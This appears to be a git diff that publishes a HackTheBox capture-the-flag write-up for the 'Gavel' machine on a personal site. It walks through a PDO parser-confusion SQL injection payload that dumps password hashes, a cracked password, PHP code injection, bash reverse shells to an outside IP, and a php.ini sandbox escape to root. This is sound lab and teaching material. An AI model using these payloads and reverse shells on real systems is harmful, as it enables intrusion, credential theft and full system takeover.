@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Gavel - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Gavel.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Gavel machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Gavel machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Gavel, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,215 @@
         <h1 class="writeup-title">Gavel</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">March 14, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/Gavel/pwned.png" /></p>
-<p>Gavel is an ACTIVE machine!</p>
-<p>This write-up will go live once Gavel retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>Gavel was a medium-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and HTTP on port 80. The web application was an auction house platform where users could register, bid on items, and manage inventory.
+Directory fuzzing uncovered an exposed .git repository, which I dumped using git-dumper to obtain the full source code.
+Reviewing the source revealed that inventory.php constructed SQL queries using PDO prepared statements while concatenating user-controlled input, specifically the sort and user_id POST parameters.
+Crucially, the config had PDO emulated prepares enabled, making it vulnerable to a PDO parser confusion attack. By crafting a payload that caused PDO to misinterpret the query structure, I turned user_id into an unsanitized injection point and extracted credentials from the users table using CONCAT_WS with CHAR(58) to avoid quote and semicolon parsing issues.
+Cracking the auctioneer's hash with JtR and rockyou revealed the password midnight1.</p>
+<p>Logging in as auctioneer granted access to an administrative panel for editing auction rules. Cross-referencing the source code showed that rule values were written into YAML files and later evaluated as PHP during bid processing.
+This allowed arbitrary PHP code execution by injecting a bash reverse shell into a rule field and triggering it by placing a bid, granting a foothold on the machine.
+Switching to the auctioneer user with their password revealed the user flag.</p>
+<p>For privilege escalation, reversing two binaries <code>gavel-util</code> and <code>gaveld</code> in Ghidra revealed an IPC mechanism where gaveld, running as root, processed YAML submissions from gavel-util and evaluated their rule fields inside a PHP sandbox enforced via a restrictive php.ini.
+The binary read the php.ini path from the RULE_PATH environment variable, defaulting to a hardcoded safe config if absent. By crafting a permissive php.ini with most dangerous functions re-enabled, setting RULE_PATH to point to it, and submitting a malicious YAML file containing a reverse shell as the rule value, the sandbox was bypassed and code executed as root.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Gavel/nmap.png" /></p>
+<p>Initial nmap scan reveals just 2 ports. SSH on 22 and HTTP on 80.</p>
+<h2>Checking out the website</h2>
+<p><img alt="website" src="../images/Gavel/website.png" /></p>
+<p>It is a website for an auction house, and I can see some items right away. I'll make an account with the credentials of <code>test:testtest</code></p>
+<p><img alt="loggedin" src="../images/Gavel/loggedin.png" /></p>
+<p>I don't have any items in my inventory yet, of course, so I'll check out the auctions.</p>
+<p><img alt="bidding" src="../images/Gavel/bidding.png" /></p>
+<p>Each auction has a specific rule to it. In addition to that, whatever I bid, even if I don't win the auction, will be lost. I'll have to be mindful of my balance(50k is the starting fund), so I will bid on just a single item for now.</p>
+<p>In the inventory, I can sort either by <code>name</code> or <code>quantity</code>. The POST request sent to change the sorting contains <code>user_id=2&amp;sort=quantity</code>, but trying to guess what might be happening under the hood blindly would be tedious. I will fuzz for directories and endpoints, my prime target being either git/gitea or an uncovered git branch that might reveal the source code. Otherwise, I will have to play with this blindly.</p>
+<h2>Directory fuzzing and investigating the source code</h2>
+<p><img alt="git" src="../images/Gavel/git.png" /></p>
+<p>Bingo! There is an exposed git repo up for grabs, which I'll dump using gitdumper.</p>
+<p><code>python git-dumper/git_dumper.py http://gavel.htb gitout</code></p>
+<p><img alt="source" src="../images/Gavel/source.png" /></p>
+<p>Looking at the <code>inventory.php</code> file reveals an interesting detail in the following snippet.</p>
+<pre class="codehilite"><code>&lt;?php
+require_once __DIR__ . '/includes/config.php';
+require_once __DIR__ . '/includes/db.php';
+require_once __DIR__ . '/includes/session.php';
+
+if (!isset($_SESSION['user'])) {
+    header('Location: index.php');
+    exit;
+}
+
+$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
+$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
+$col = &quot;`&quot; . str_replace(&quot;`&quot;, &quot;&quot;, $sortItem) . &quot;`&quot;;
+$itemMap = [];
+$itemMeta = $pdo-&gt;prepare(&quot;SELECT name, description, image FROM items WHERE name = ?&quot;);
+try {
+    if ($sortItem === 'quantity') {
+        $stmt = $pdo-&gt;prepare(&quot;SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC&quot;);
+        $stmt-&gt;execute([$userId]);
+    } else {
+        $stmt = $pdo-&gt;prepare(&quot;SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC&quot;);
+        $stmt-&gt;execute([$userId]);
+&lt;SNIP&gt;
+</code></pre>
+
+<p>It is using PDO prepared statements to construct the queries, into which user-controlled input <code>sort</code> and <code>user_id</code> are concatenated. There is a cool attack involving the PDO parser, but before trying it, I will check whether <code>PDO::ATTR_EMULATE_PREPARES</code> is disabled in the config.</p>
+<p><img alt="pdo" src="../images/Gavel/pdo.png" /></p>
+<p>PDO emulates all prepared statements in MySQL by default, which means that these queries are indeed vulnerable to a <code>PDO parser confusion</code> attack.</p>
+<h2>PDO parser confusion attack</h2>
+<p><a href="https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/">https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/</a></p>
+<p>Following the article above, I constructed a query that abuses both parameters. We want to have our SQLi payload located inside <code>user_id</code>, as it is not sanitized at all, unlike <code>sort</code>.</p>
+<pre class="codehilite"><code>user_id=x`+FROM+(SELECT+table_name+AS+`%27x`+from+information_schema.tables)y;--+-&amp;sort=\?--+-%00
+</code></pre>
+
+<p>After PDO is done with the query, it will look more or less like this: <code>SELECT ? FROM inventory WHERE user_id = ?</code>, effectively making <code>user_id</code> into an unsanitized SQLi injection point. Because of the first comment, I don't have to worry about the second question mark. Without comments, an error would be thrown because there is only one bound value, while there are 2 placeholders(?).</p>
+<p><img alt="burp" src="../images/Gavel/burp.png" /></p>
+<p>And here's what it looks like on the website itself.</p>
+<p><img alt="web" src="../images/Gavel/web.png" /></p>
+<p>Now, to extract actual data from the users table, I will use concat with a separator. This is because single quotes and semicolons will probably get swallowed by the parser in the process of preparing the query.</p>
+<pre class="codehilite"><code>user_id=x`+FROM+(SELECT+CONCAT_WS(CHAR(58),+username,+password)+AS+`%27x`+from+users)y;--+-&amp;sort=\?--+-%00
+
+58 in ASCII = :
+</code></pre>
+
+<p>The same effect could be achieved by using normal concat, and just replacing the colon with its hex value <code>0x3a</code></p>
+<p><img alt="hashes" src="../images/Gavel/hashes.png" /></p>
+<p>I'll take the auctioneer hash for some cracking with JtR.</p>
+<p><code>john hash -wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/Gavel/cracked.png" /></p>
+<p><code>auctioneer | midnight1</code></p>
+<p>These credentials don't work on SSH. I'll try logging into the website instead.</p>
+<h2>Command injection in the rule field</h2>
+<p><img alt="panel" src="../images/Gavel/panel.png" /></p>
+<p>The auctioneer has access to the administrative panel, where they can edit rules and messages for auctions. I'll take a look at the source code of <code>admin.php</code></p>
+<p><img alt="admin" src="../images/Gavel/admin.png" /></p>
+<p>Nothing interesting here. I will grep the source code for <code>rule</code> to see where else it appears.</p>
+<p><img alt="other" src="../images/Gavel/other.png" /></p>
+<p>The rule value is written into a specified .yaml file for a specified auction. From the <code>default.yaml</code> entries, it looks like PHP code can be written into the rule value.</p>
+<p>Essentially, I can write whatever I want into a .yaml file, as long as it's valid PHP code. If something happens to run these PHP commands afterwards, I will get code execution!</p>
+<p><code>system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.213/9001 0&gt;&amp;1"'); return true;</code></p>
+<p>I saved the edit and bid on the modified auction(I set the message to "test", so that I would know which one it was).</p>
+<p><img alt="shell" src="../images/Gavel/shell.png" /></p>
+<p>The only user with a <code>home</code> directory was auctioneer, for which the earlier credential worked(midnight1) via <code>su auctioneer</code>. In their home directory, I found the user flag.</p>
+<p><img alt="user" src="../images/Gavel/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="sudol" src="../images/Gavel/sudol.png" /></p>
+<p>Auctioneer cannot run anything with sudo... But they own a certain ELF file. Looking at the commands, it seems to accept YAML files... I'll get this binary onto my box so that I can take a better look at it.</p>
+<pre class="codehilite"><code>timeout 5 cat &lt; /dev/tcp/10.129.242.203/9002 &gt; ~/HTB/Gavel/gavel-util | On attack box
+
+nc -lnkvp 9002 &gt; gavel-util | On target
+</code></pre>
+
+<p>In Ghidra, there isn't much to see apart from what I already know.</p>
+<p><img alt="ghidra" src="../images/Gavel/ghidra.png" /></p>
+<p>The malware tries to connect to a different bin, <code>gaveld</code>, which is worth exploring later on.</p>
+<p><img alt="ghidra2" src="../images/Gavel/ghidra2.png" /></p>
+<p>It also uses this <code>collect_env</code> function, suggesting it might be setting/collecting certain env variables. The function itself doesn't reveal much, though, only that it uses <code>environ</code> from GLIBC.</p>
+<h2>Analyzing the gaveld binary</h2>
+<p>Knowing its name, I quickly found the binary in question in <code>/opt/gavel</code></p>
+<p><img alt="transfer" src="../images/Gavel/transfer.png" /></p>
+<p>And just like before, I'll chuck this bin into Ghidra for analysis.</p>
+<p><img alt="ghidra3" src="../images/Gavel/ghidra3.png" /></p>
+<p>The main function is responsible for initiating the socket, which works like an IPC pipe. It communicates with gavel-utils, looking for submissions, and for each entry it forks a process with a maximum of 16 queued processes. <code>handle_conn</code> handles each <code>request</code> created by <code>gavel-util</code>, be it either submit, invoice, or stats. The daemon is set up to be owned by root, but also accessible to the <code>gavel-seller</code> group, which auctioneer is a part of.</p>
+<p><code>submit</code> request is the most interesting one here, because eventually it will call the <code>php_safe_ini</code> function.</p>
+<p><img alt="ghidra4" src="../images/Gavel/ghidra4.png" /></p>
+<p>This function starts by grabbing a JSON object(most likely from the submit action), as well as the <code>DAT_00105004 = env</code> environmental variables. From the env, it picks out the <code>RULE_PATH</code> variable, and if it's missing, it will default to <code>/opt/gavel/.config/php/php.ini</code> instead.</p>
+<p>Then, it constructs a PHP script more or less like this:</p>
+<pre class="codehilite"><code>function __sandbox_eval() {
+    $previous_bid = 96;
+    $current_bid = 200;
+    $bidder = 'Shadow21A';
+
+    &lt;USER CODE HERE&gt;
+};
+
+$res = __sandbox_eval();
+
+if(!is_bool($res)) {
+    echo 'SANDBOX_RETURN_ERROR';
+}
+else if ($res) {
+    echo 'ILLEGAL_RULE';
+}
+</code></pre>
+
+<p>The user code must return a boolean, else it'll error out with <code>ILLEGAL_RULE</code></p>
+<p>It then generates a command <code>/usr/bin/php -c /path/to/php.ini -d display_errors=1 -r "&lt;generated php code&gt;"</code>, before setting up a pipe and creating a child process with fork. The child ultimately executes the command containing user code and returns the output back to the parent, which scans it for PHP errors.</p>
+<p>Knowing all this, I can sort of see a way forward. My main idea is to see how the php.ini config looks like and what is banned, and create/pass my own malicious one, which will be much less restrictive.</p>
+<h2>Escaping the sandbox for root code execution</h2>
+<pre class="codehilite"><code># php.ini
+
+engine=On
+display_errors=On
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off
+</code></pre>
+
+<p>There are quite a lot of functions disabled. I'll leave a few I won't use as disabled, so that the value isn't blank.</p>
+<pre class="codehilite"><code># malphp.ini
+
+engine=On
+display_errors=On
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,eval
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off
+</code></pre>
+
+<p>Now I'll set the <code>RULE_PATH</code> envvar to <code>/home/auctioneer/malphp.ini</code>, so that gaveld will use my prepared config file instead of the safe one.</p>
+<p>As for the .yaml file, the <code>/opt/gavel</code> directory contains an example like this:</p>
+<pre class="codehilite"><code># sample.yaml
+
+---
+item:
+  name: &quot;Dragon's Feathered Hat&quot;
+  description: &quot;A flamboyant hat rumored to make dragons jealous.&quot;
+  image: &quot;https://example.com/dragon_hat.png&quot;
+  price: 10000
+  rule_msg: &quot;Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item.&quot;
+  rule: &quot;return ($current_bid &gt;= $previous_bid * 1.2) &amp;&amp; ($bidder != 'sado');&quot;
+</code></pre>
+
+<p>Which I'll change a bit to accommodate command execution.</p>
+<pre class="codehilite"><code># malsample.yaml
+
+name: &quot;Dragon's Feathered Hat&quot;
+description: &quot;A flamboyant hat rumored to make dragons jealous.&quot;
+image: &quot;https://example.com/dragon_hat.png&quot;
+price: 10000
+rule_msg: &quot;Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item.&quot;
+rule: &quot;system('bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.213/9001 0&gt;&amp;1\&quot;'); return true;&quot;
+</code></pre>
+
+<p>The second set of double quotes has to be escaped in order to avoid messing with the overarching ones. This way, they'll be treated as text and will be sent together with the whole revshell command.</p>
+<p><img alt="setup" src="../images/Gavel/setup.png" /></p>
+<p>Now I'll run <code>gavel-util</code> to submit my malicious .yaml file.</p>
+<p><code>/usr/local/bin/gavel-util submit malsample.yaml</code></p>
+<p><img alt="root" src="../images/Gavel/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +286,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
